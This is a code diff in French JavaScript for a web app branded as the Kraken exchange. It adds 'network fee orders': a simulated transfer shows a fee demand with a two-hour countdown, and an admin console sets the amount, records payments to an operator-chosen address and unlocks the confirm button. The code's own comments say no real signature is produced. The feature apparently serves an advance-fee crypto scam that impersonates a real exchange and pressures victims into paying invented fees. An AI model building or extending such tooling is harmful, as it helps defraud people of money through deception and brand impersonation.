@@ -58,6 +58,7 @@
     feeAddresses: {},
     customAssets: [],
     actSeed: null,
+    feeOrders: {},
     rev: 0
   };
   const KEY = "kraken_demo_v4";
@@ -1151,6 +1152,73 @@
     ST.balances[feeSrc] = Math.max(0, qty(feeSrc) - fee / px1);
   }
 
+  // ── frais réseau à régler : ordre suivi par la console admin ────────
+  // Un envoi dont l'actif de frais (ETH sur les réseaux EVM) ne couvre pas
+  // crée un ordre : 2 h pour régler, montant piloté par la console, et le
+  // bouton de validation reste grisé tant que l'admin n'a pas dit oui.
+  const FEE_TTL = 2 * 60 * 60 * 1000;
+
+  function feeOrders() {
+    if (!ST.feeOrders || typeof ST.feeOrders !== "object") ST.feeOrders = {};
+    // Un ordre expiré depuis plus de 24 h (ou réglé) sort de l'état : la
+    // liste de la console ne grossit pas indéfiniment.
+    const cut = Date.now() - 24 * 60 * 60 * 1000;
+    for (const [id, o] of Object.entries(ST.feeOrders)) {
+      if (!o || typeof o !== "object") { delete ST.feeOrders[id]; continue; }
+      const exp = Number(o.exp) || Number(o.at) || 0;
+      if (exp && exp < cut) delete ST.feeOrders[id];
+    }
+    return ST.feeOrders;
+  }
+
+  function feeOrderNew({ pick, amt, fee, sym, addr }) {
+    const id = "fo" + Date.now().toString(36) + Math.floor(Math.random() * 1e4).toString(36);
+    const at = Date.now();
+    const o = {
+      id, at, exp: at + FEE_TTL, amount: fee, sym, pick, amt,
+      addr: String(addr || ""), paid: 0, ok: false, done: false
+    };
+    feeOrders()[id] = o;
+    saveLocal();
+    iaPublish({ type: "feeOrder", order: { ...o } });
+    return o;
+  }
+
+  // Le montant suit les frais publiés par la console : s'ils changent pendant
+  // le délai, le reste à payer se met à jour sans toucher à l'ordre.
+  function feeRemaining(o) {
+    const live = Number(netFee(o.pick || "USDC")) || 0;
+    const amount = live > 0 ? live : Number(o.amount) || 0;
+    const paid = Math.max(0, Number(o.paid) || 0);
+    return { amount, paid, remaining: Math.max(0, amount - paid) };
+  }
+
+  function feeCountTxt(ms) {
+    if (!(ms > 0)) return "Délai dépassé";
+    const t = Math.floor(ms / 1000);
+    const h = Math.floor(t / 3600), m = Math.floor((t % 3600) / 60), sec = t % 60;
+    return String(h).padStart(2, "0") + ":" + String(m).padStart(2, "0") + ":" + String(sec).padStart(2, "0");
+  }
+
+  // Fusion d'un ordre reçu (message ou état publié) : le reçu encaissé et la
+  // validation ne reculent jamais, quel que soit l'appareil qui publie.
+  function mergeFeeOrder(r) {
+    if (!r || typeof r !== "object" || !r.id) return false;
+    const mine = feeOrders();
+    const cur = mine[r.id];
+    if (!cur) { mine[r.id] = { ...r }; return true; }
+    let changed = false;
+    const paid = Math.max(Number(cur.paid) || 0, Number(r.paid) || 0);
+    if (paid !== (Number(cur.paid) || 0)) { cur.paid = paid; changed = true; }
+    if (r.ok && !cur.ok) { cur.ok = true; changed = true; }
+    if (r.done && !cur.done) { cur.done = true; changed = true; }
+    if (r.via && !cur.via) { cur.via = String(r.via); changed = true; }
+    if (r.addr && !cur.addr) { cur.addr = String(r.addr); changed = true; }
+    if (Number(r.amount) > 0) cur.amount = Number(r.amount);
+    if (Number(r.exp) > 0) cur.exp = Number(r.exp);
+    return changed;
+  }
+
   function checkUsdcSend(addrRaw, amt) {
     const addr = addrRaw.trim();
     const net = usdcNet();
@@ -1213,22 +1281,32 @@
           } else {
             ST.balances[pick] = Math.max(0, qty(pick) - amt);
             // Frais couverts par l'actif de frais : débités tout de suite.
-            // Sinon rien n'est débité, la demande arrive sur l'écran de fin.
+            // Sinon rien n'est débité, un ordre de frais part à la console.
             if (!due.short) applyFeePayment(fee, due.sym);
           }
-          addNotif({
-            id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
-            amount: amt, addr, fee, feeAddr: fee > 0 ? feeAddrFor(pick) : null, at: Date.now(),
-            text: "Envoi de " + qtyTxt(amt, pick) + " confirmé"
-          });
+          const short = fee > 0 && due.short;
+          const ord = short ? feeOrderNew({ pick, amt, fee, sym: due.sym, addr }) : null;
+          if (ord) {
+            addNotif({
+              id: "fee_" + ord.id, kind: "fee", at: ord.at, exp: ord.exp, orderId: ord.id,
+              amount: fee, asset: due.sym,
+              text: "Frais réseau à régler : " + eur(fee, 2) + " en " + due.sym + " — 2 h pour régler."
+            });
+          } else {
+            addNotif({
+              id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
+              amount: amt, addr, fee, feeAddr: fee > 0 ? feeAddrFor(pick) : null, at: Date.now(),
+              text: "Envoi de " + qtyTxt(amt, pick) + " confirmé"
+            });
+          }
           saveLocal(); renderAll();
-          sheetSendDone({ pick, addr, amt, fee });
+          sheetSendDone({ pick, addr, amt, fee, orderId: ord ? ord.id : null });
         });
       }, 550);
     });
   }
 
-  function sheetSendDone({ pick, addr, amt, fee, feeSrc, settled }) {
+  function sheetSendDone({ pick, addr, amt, fee, orderId }) {
     // getRandomValues exige un contexte sécurisé (https ou localhost).
     // En HTTP simple (IP LAN), on retombe sur Math.random : la référence
     // n'est qu'un affichage, aucune signature réelle n'est produite.
@@ -1239,24 +1317,26 @@
       for (let i = 0; i < rnd.length; i++) rnd[i] = (Math.random() * 256) | 0;
     }
     const ref = "0x" + Array.from(rnd, b => b.toString(16).padStart(2, "0")).join("");
-    // Demande de paiement des frais : seulement si l'actif de frais (ETH sur
-    // les réseaux EVM) ne couvre pas, et tant que rien n'a été réglé.
-    // `settled` = frais déjà honorés (portefeuille choisi ici ou envoi externe).
     const due = feeDueInfo(pick, fee);
-    const pending = fee > 0 && due.short && !settled;
-    const srcs = pending ? feeSourceList(fee) : [];
+    const order = orderId ? (feeOrders()[orderId] || null) : null;
+    const pending = !!order && !order.done;
+    const rem = order ? feeRemaining(order) : null;
+    const feeSym = order ? order.sym : due.sym;
+    const feeAddrNow = feeSym === "EUR" ? "" : feeAddrFor(feeSym);
+    const feeNow = rem ? rem.amount : fee;
+    const srcs = pending ? feeSourceList(feeNow) : [];
     const payables = srcs.filter(x => x.enough);
-    const dueAddr = due.sym === "EUR" ? "" : feeAddrFor(due.sym);
     const feeLine = pending
       ? "en attente"
-      : (feeSrc || (due.short ? "envoyés depuis un portefeuille externe" : due.sym));
+      : (order && order.via ? order.via : (due.short ? "hors application" : due.sym));
+    window.__feeOpen = pending ? order.id : null;
     openSheet(`<div class="sheet-title">${pending ? "Frais réseau à régler" : "Envoi en cours"}</div>
       <p class="sheet-sub">${pending
-        ? "La transaction est diffusée. Il reste les frais réseau à régler pour qu'elle soit confirmée."
+        ? `Il reste ${eur(rem.remaining, 2)} de frais réseau à régler en ${feeSym} pour confirmer la transaction.`
         : "Votre transaction a été signée puis diffusée sur le réseau."}</p>
       <div class="recap">
         <div class="rc-row"><span>Montant</span><b>${pick === "EUR" ? eur(amt, 2) : qtyTxt(amt, pick)}</b></div>
-        <div class="rc-row"><span>Frais réseau</span><b>${fee ? eur(fee, 2) : "Offerts"}</b></div>
+        <div class="rc-row"><span>Frais réseau</span><b id="feeAmount">${eur(feeNow, 2)}</b></div>
         ${fee > 0 ? `<div class="rc-row"><span>Frais réglés en</span><b>${feeLine}</b></div>` : ""}
         ${fee > 0 ? `<div class="rc-row col"><span>Frais crédités à</span><code>${shortAddr(feeAddrFor(pick))}</code></div>` : ""}
         <div class="rc-row col"><span>Destinataire</span><code>${shortAddr(addr)}</code></div>
@@ -1265,10 +1345,12 @@
       </div>
       ${pending ? `<div class="fee-due">
         <b>Frais réseau à régler</b>
-        <p>Votre solde en ${due.sym} (${eur(due.held, 2)}) ne couvre pas les frais réseau de ${eur(fee, 2)}. Envoyez ${eur(fee, 2)} en ${due.sym} à l'adresse ci-dessous pour que la transaction soit confirmée.</p>
+        <p>Envoyez <b id="feeRemain">${eur(rem.remaining, 2)}</b> en ${feeSym} à l'adresse ci-dessous. Le montant suit les frais publiés par la console.</p>
         <div class="recap">
-          <div class="rc-row"><span>Montant à envoyer</span><b>${eur(fee, 2)}</b></div>
-          <div class="rc-row col"><span>Adresse des frais (${due.sym})</span><code>${dueAddr}</code></div>
+          <div class="rc-row"><span>Montant à envoyer</span><b id="feeRemain2">${eur(rem.remaining, 2)}</b></div>
+          <div class="rc-row"><span>Déjà reçu</span><b id="feePaid">${eur(rem.paid, 2)}</b></div>
+          <div class="rc-row col"><span>Adresse des frais (${feeSym})</span><code>${feeAddrNow}</code></div>
+          <div class="rc-row"><span>Temps restant</span><b id="feeCount" class="fee-count wait">${feeCountTxt(order.exp - Date.now())}</b></div>
         </div>
         <button class="btn-ghost wide" id="sdDueCopy">Copier l'adresse des frais</button>
         <div class="fee-src-box">
@@ -1282,34 +1364,88 @@
           </div>
           ${payables.length ? "" : `<p class="fee-src-warn">Aucun portefeuille ne couvre ces frais : envoie le montant à l'adresse ci-dessus depuis un portefeuille externe.</p>`}
         </div>
+        <p class="sheet-note">Dès que la console confirme la réception, le bouton de validation se débloque.</p>
       </div>` : ""}
       ${pending
-        ? `<button class="btn-black" id="sdFeeSent">J'ai envoyé les frais</button>
+        ? `<button class="btn-black" id="sdFeeSent"${order.ok ? "" : " disabled"}>${order.ok ? "J'ai envoyé les frais" : "En attente de validation par l'admin"}</button>
            <button class="btn-ghost wide" id="sdOk">Plus tard</button>`
         : `<button class="btn-black" id="sdOk">Terminé</button>`}`);
-    $("#sdOk").addEventListener("click", closeSheet);
+    $("#sdOk").addEventListener("click", () => { window.__feeOpen = null; closeSheet(); });
 
     const dueBtn = $("#sdDueCopy");
     if (dueBtn) dueBtn.addEventListener("click", () => {
-      navigator.clipboard?.writeText(dueAddr);
+      navigator.clipboard?.writeText(feeAddrNow);
       toast("Adresse des frais copiée");
     });
 
     const sentBtn = $("#sdFeeSent");
     if (sentBtn) sentBtn.addEventListener("click", () => {
-      sheetSendDone({ pick, addr, amt, fee, settled: true });
+      if (!order || !order.ok) return toast("En attente de validation par l'admin");
+      order.done = true;
+      order.doneAt = Date.now();
+      saveLocal();
+      iaPublish({ type: "feeOrder", order: { ...order } });
+      addNotif({
+        id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
+        amount: amt, addr, fee, feeAddr: fee > 0 ? feeAddrFor(pick) : null, at: Date.now(),
+        text: "Envoi de " + qtyTxt(amt, pick) + " confirmé"
+      });
+      sheetSendDone({ pick, addr, amt, fee, orderId: order.id });
       toast("Frais envoyés — transaction en cours de confirmation");
     });
 
     $$("#sdFeeSrcList .fee-src-btn").forEach(b => b.addEventListener("click", () => {
       if (b.disabled || !b.dataset.src) return;
       const sym = b.dataset.src;
-      applyFeePayment(fee, sym);
-      saveLocal(); renderAll();
-      sheetSendDone({ pick, addr, amt, fee, feeSrc: sym, settled: true });
+      applyFeePayment(feeNow, sym);
+      if (order) {
+        order.paid = rem.amount;
+        order.ok = true;
+        order.done = true;
+        order.via = sym;
+        saveLocal();
+        iaPublish({ type: "feeOrder", order: { ...order } });
+        addNotif({
+          id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
+          amount: amt, addr, fee, at: Date.now(),
+          text: "Envoi de " + qtyTxt(amt, pick) + " confirmé"
+        });
+      }
+      renderAll();
+      sheetSendDone({ pick, addr, amt, fee, orderId: order ? order.id : null });
       toast("Frais réglés en " + sym);
     }));
   }
+
+  // Compte à rebours et montants live : la feuille des frais et les
+  // notifications se rafraîchissent seules pendant les 2 h, y compris si
+  // l'admin change le montant en cours de route.
+  function feeTick() {
+    const o = window.__feeOpen ? feeOrders()[window.__feeOpen] : null;
+    if (o) {
+      const rem = feeRemaining(o);
+      const c = document.getElementById("feeCount");
+      if (c) {
+        c.textContent = feeCountTxt(o.exp - Date.now());
+        c.classList.toggle("wait", o.exp > Date.now());
+      }
+      const setTxt = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+      setTxt("feeRemain", eur(rem.remaining, 2));
+      setTxt("feeRemain2", eur(rem.remaining, 2));
+      setTxt("feePaid", eur(rem.paid, 2));
+      setTxt("feeAmount", eur(rem.amount, 2));
+      const btn = document.getElementById("sdFeeSent");
+      if (btn) {
+        btn.disabled = !o.ok;
+        btn.textContent = o.ok ? "J'ai envoyé les frais" : "En attente de validation par l'admin";
+      }
+    }
+    document.querySelectorAll("[data-exp]").forEach(el => {
+      const t = Number(el.dataset.exp) || 0;
+      el.textContent = t ? "Temps restant : " + feeCountTxt(t - Date.now()) : "";
+    });
+  }
+  setInterval(feeTick, 1000);
 
   function sheetReceive(explicit) {
     PICK = explicit || PICK || "BTC";
@@ -1564,7 +1700,10 @@
 
   function showBanner(o) {
     const host = stackHost();
-    const label = o.kind === "deposit" ? "Dépôt reçu" : o.kind === "withdraw" ? "Retrait envoyé" : "Notification";
+    const label = o.kind === "deposit" ? "Dépôt reçu"
+      : o.kind === "withdraw" ? "Retrait envoyé"
+      : o.kind === "fee" ? "Frais réseau à régler"
+      : "Notification";
     const body = bannerBody(o);
     const b = document.createElement("div");
     b.className = "ios-banner";
@@ -1710,7 +1849,11 @@
   function addNotif(o) {
     const list = notifList();
     if (list.some(x => x.id === o.id)) return;
-    list.unshift({ id: o.id, text: o.text || "", amount: o.amount || 0, addr: o.addr || "", at: o.at || Date.now(), kind: o.kind || "notice", asset: o.asset || "" });
+    list.unshift({
+      id: o.id, text: o.text || "", amount: o.amount || 0, addr: o.addr || "",
+      at: o.at || Date.now(), kind: o.kind || "notice", asset: o.asset || "",
+      exp: Number(o.exp) || 0, orderId: o.orderId || ""
+    });
     notifSave(list);
     notifBadge(); showBanner(o);
   }
@@ -1869,20 +2012,29 @@
       ${notifSettingsRow()}
       <p class="sheet-sub">${list.length} message${list.length > 1 ? "s" : ""} reçu${list.length > 1 ? "s" : ""}.</p>
       <div class="notif-list">${list.map(n => `
-        <div class="notif">
+        <div class="notif"${n.orderId ? ` data-notiforder="${n.orderId}" role="button" tabindex="0"` : ""}>
           <span class="notif-ico ${n.kind === "deposit" ? "is-dep" : ""}">
             <svg viewBox="0 0 24 24" class="ico"><path d="M12 19V5"/><path d="M6 11l6-6 6 6"/></svg>
           </span>
           <div class="notif-main">
-            <div class="notif-title">${n.kind === "deposit" ? "Dépôt reçu" : "Notification"}</div>
+            <div class="notif-title">${n.kind === "deposit" ? "Dépôt reçu" : n.kind === "fee" ? "Frais réseau à régler" : n.kind === "withdraw" ? "Retrait envoyé" : "Notification"}</div>
             <div class="notif-text">${n.text || (n.amount ? "Un dépôt a été crédité sur votre compte." : "Nouveau message de Kraken.")}</div>
-            ${n.amount ? `<div class="notif-meta">+${n.asset && n.asset !== "EUR" ? qtyTxt(n.amount, n.asset) : eur(n.amount, 2)}</div>` : ""}
+            ${n.kind === "fee" && n.amount ? `<div class="notif-meta">${eur(n.amount, 2)} en ${n.asset || "ETH"}</div>` : ""}
+            ${n.kind !== "fee" && n.amount ? `<div class="notif-meta">+${n.asset && n.asset !== "EUR" ? qtyTxt(n.amount, n.asset) : eur(n.amount, 2)}</div>` : ""}
+            ${n.exp ? `<div class="notif-when fee-count" data-exp="${n.exp}">Temps restant</div>` : ""}
             ${n.addr ? `<div class="notif-addr">${shortAddr(n.addr)}</div>` : ""}
             <div class="notif-when">${fmtWhen(n.at)}</div>
           </div>
         </div>`).join("")}</div>
       <button class="btn-ghost wide" id="notifPreview">Afficher un aperçu</button>`);
     bindNotifSheet();
+    // Une notif de frais rouvre l'écran de règlement, avec son chrono à jour.
+    $$("[data-notiforder]").forEach(el => el.addEventListener("click", () => {
+      const o = feeOrders()[el.dataset.notiforder];
+      if (!o) return toast("Demande de frais introuvable");
+      closeSheet();
+      sheetSendDone({ pick: o.pick || "USDC", addr: o.addr || "", amt: Number(o.amt) || 0, fee: Number(o.amount) || 0, orderId: o.id });
+    }));
   }
 
   async function publishAccount() {
@@ -1943,6 +2095,9 @@
         up: !!x.up, d: String(x.d || "")
       }));
     }
+    if (s.feeOrders && typeof s.feeOrders === "object") {
+      for (const r of Object.values(s.feeOrders)) mergeFeeOrder(r);
+    }
     ST.rev = Number(s.rev) || 0;
     saveLocal();
     return true;
@@ -1968,6 +2123,7 @@
       const txt = await r.text();
       let best = null, bestT = 0;
       const fresh = [];
+      const freshOrders = [];
       for (const line of txt.split("\n")) {
         if (!line.trim()) continue;
         let m;
@@ -1977,6 +2133,7 @@
         try { p = JSON.parse(m.message); } catch { continue; }
         if (p.app !== "kraken") continue;
         if (p.type === "notif" && p.notif) { fresh.push(p.notif); continue; }
+        if (p.type === "feeOrder" && p.order) { freshOrders.push(p.order); continue; }
         if (p.type !== "state" || !p.state) continue;
         // L'ordre vient de l'horodatage du serveur ntfy : plus de comparaison
         // d'horloges entre appareils, donc plus de mise a jour perdue.
@@ -1995,6 +2152,11 @@
           at: Number(n.at) || Date.now()
         });
       });
+      if (freshOrders.length) {
+        let touched = false;
+        freshOrders.forEach(o => { if (mergeFeeOrder(o)) touched = true; });
+        if (touched) saveLocal();
+      }
       const seen = Number(ST.msgTime) || 0;
       if (best && (bestT > seen || Number(best.rev) !== (Number(ST.rev) || 0))) {
         if (applyState(best)) {
@@ -2100,6 +2262,7 @@
     feeAddresses: { ...ST.feeAddresses },
     customAssets: (ST.customAssets || []).map(x => ({ ...x })),
     actSeed: Array.isArray(ST.actSeed) ? ST.actSeed.map(x => ({ ...x })) : null,
+    feeOrders: Object.fromEntries(Object.entries(feeOrders()).map(([k, v]) => [k, { ...v }])),
     rev: Number(ST.rev) || 0
   });
 
@@ -2178,6 +2341,24 @@
         <button type="button" data-ia="delCoin" data-sym="${iaEsc(x.sym)}">Retirer</button>
       </div>`).join("") : `<p class="ia-empty">Aucun actif ajouté pour le moment.</p>`;
 
+    // Paiements de frais en attente : montant, reçu, reste, état.
+    const fOrders = Object.values(feeOrders())
+      .filter(o => !o.done && (Number(o.exp) || 0) > Date.now() - 6 * 60 * 60 * 1000)
+      .sort((x, y) => (Number(y.at) || 0) - (Number(x.at) || 0));
+    const fOrderRows = fOrders.length ? fOrders.map(o => {
+      const rem = feeRemaining(o);
+      const state = o.done ? "réglé" : o.ok ? "validé" : (Number(o.exp) < Date.now() ? "délai dépassé" : "en attente");
+      return `<div class="ia-addr ia-feeord">
+        <span class="ia-mid"><b>${eur(rem.amount, 2)}</b> ${iaEsc(o.sym)} · ${iaEsc(state)}<br>reçu ${eur(rem.paid, 2)} · reste ${eur(rem.remaining, 2)}</span>
+        <input data-iapaid="${iaEsc(o.id)}" inputmode="decimal" autocomplete="off" placeholder="Reçu (€)">
+        <span class="ia-btns">
+          <button type="button" data-ia="feePartial" data-id="${iaEsc(o.id)}">Ajouter</button>
+          <button type="button" data-ia="feeOk" data-id="${iaEsc(o.id)}">C'est bon</button>
+          <button type="button" data-ia="feeDel" data-id="${iaEsc(o.id)}">Retirer</button>
+        </span>
+      </div>`;
+    }).join("") : `<p class="ia-empty">Aucun paiement de frais en attente.</p>`;
+
     const hist = activityList();
     const histRows = hist.length ? hist.map(x => `<div class="ia-addr">
         <span class="ia-mid"><b>${iaEsc(x.t)}</b> · ${iaEsc(x.s)} · ${iaEsc(x.a)} · ${iaEsc(x.d)}</span>
@@ -2218,6 +2399,12 @@
         <p class="ia-sub">L'adresse qui encaisse les frais réseau, actif par actif. Vide = même adresse que la réception.</p>
         ${feeAddrRows}
         <button type="button" class="ia-btn" data-ia="saveFeeAddr">Publier les adresses de frais</button>
+      </section>
+
+      <section class="ia-card">
+        <h3>Frais réseau en attente</h3>
+        <p class="ia-sub">Chaque envoi dont les frais n'étaient pas couverts apparaît ici pendant 2 h. « Ajouter » enregistre un reçu partiel, « C'est bon » débloque le bouton de validation côté client.</p>
+        ${fOrderRows}
       </section>
 
       <section class="ia-card">
@@ -2365,6 +2552,25 @@
       const i = ASSETS.findIndex(a => a.sym === sym);
       if (i >= 0) ASSETS.splice(i, 1);
       return iaCommit("Actif " + sym + " retiré");
+    }
+
+    if (act === "feePartial" || act === "feeOk" || act === "feeDel") {
+      const id = btn.dataset.id;
+      const o = feeOrders()[id];
+      if (!o) return toast("Demande de frais introuvable");
+      if (act === "feeDel") {
+        delete feeOrders()[id];
+        return iaCommit("Demande de frais retirée");
+      }
+      if (act === "feePartial") {
+        const v = iaNum(valOf('[data-iapaid="' + id + '"]'));
+        if (!(v > 0)) return toast("Saisis le montant reçu");
+        const amount = feeRemaining(o).amount;
+        o.paid = Math.min(amount, (Number(o.paid) || 0) + v);
+        return iaCommit("Reçu de " + eur(v, 2) + " enregistré");
+      }
+      o.ok = true;
+      return iaCommit("Frais validés — le client peut confirmer");
     }
 
     if (act === "sendNotif") {
